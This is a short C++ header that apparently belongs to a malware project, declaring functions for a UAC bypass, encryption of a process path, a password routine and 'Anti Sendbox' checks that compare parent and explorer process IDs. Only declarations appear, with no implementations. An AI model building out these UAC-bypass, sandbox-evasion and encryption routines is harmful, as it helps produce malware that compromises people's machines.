#include <Windows.h>
#include <iostream>
#include <fstream>


#pragma warning(disable :4996)

using namespace std;




//Bypass.cpp
int add_double_data(char new_process_path);

int increase(char start_process);

int BypassUAC();

//Encryption
int Encryption(char process_path);




//Funtions
string password();
char new_process_path(); //获取当前PROCESS路径


//Anti Sendbox
DWORD get_parent_processid(DWORD pid);
DWORD get_explorer_processid();
int determine();